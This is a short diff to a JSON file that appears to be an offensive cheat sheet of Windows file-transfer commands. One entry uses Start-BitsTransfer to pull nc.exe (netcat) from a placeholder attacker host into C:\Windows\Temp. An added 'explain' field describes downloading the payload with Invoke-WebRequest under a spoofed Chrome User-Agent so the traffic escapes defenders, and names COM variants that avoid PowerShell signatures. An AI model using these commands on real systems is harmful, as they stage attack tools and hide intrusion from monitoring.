@@ -115,5 +115,6 @@
       "command": "Import-Module bitstransfer\nStart-BitsTransfer -Source 'http://<ip>:8000/nc.exe' -Destination 'C:\\Windows\\Temp\\nc.exe'",
       "label": "BITS transfer"
     }
-  ]
+  ],
+  "explain": "Downloads a file while spoofing a real browser User-Agent so it blends into normal web traffic:\n  Invoke-WebRequest http://<ip>/nc.exe   fetch the payload\n  -UserAgent $UserAgent                  send a Chrome UA instead of the tell-tale WindowsPowerShell one\n  -OutFile ...                           save it to disk\nDefenders hunt default PowerShell/certutil UAs, so this looks like a user browsing; WinHttp/Msxml2 COM variants avoid the PowerShell signature entirely."
 }
